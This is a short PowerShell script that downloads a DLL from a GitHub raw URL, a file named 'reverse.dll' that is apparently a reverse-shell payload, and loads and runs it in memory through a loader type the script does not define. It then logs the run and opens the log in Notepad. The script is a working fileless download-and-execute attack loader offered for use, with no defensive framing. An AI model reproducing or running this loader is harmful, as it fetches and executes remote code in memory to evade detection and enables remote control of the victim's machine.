# Logging setup
$logfile = "$env:TEMP\ps_log.txt"
Start-Transcript -Path $logfile

# Additional error reporting
$ErrorActionPreference = "Stop"

# Function to download and execute the DLL
function Invoke-DLLInMemory {
    param ([string]$DllUrl)

    try {
        Write-Host "[*] Downloading and loading DLL"
        $dllBytes = (New-Object System.Net.WebClient).DownloadData($DllUrl)
        Write-Host "[+] DLL downloaded"

        # Load the DLL into memory and execute it
        Write-Host "[*] Loading and executing DLL in memory"
        [MemoryLoader]::LoadDll($dllBytes)
        Write-Host "[+] DLL successfully loaded and executed in memory"
    } catch {
        Write-Host "[!] Error executing DLL in memory: $_"
    }
}

# Example usage
Invoke-DLLInMemory -DllUrl "https://github.com/AlexTriumf/pst/raw/refs/heads/main/reverse.dll"

# End transcript and review log file
Stop-Transcript
notepad $logfile
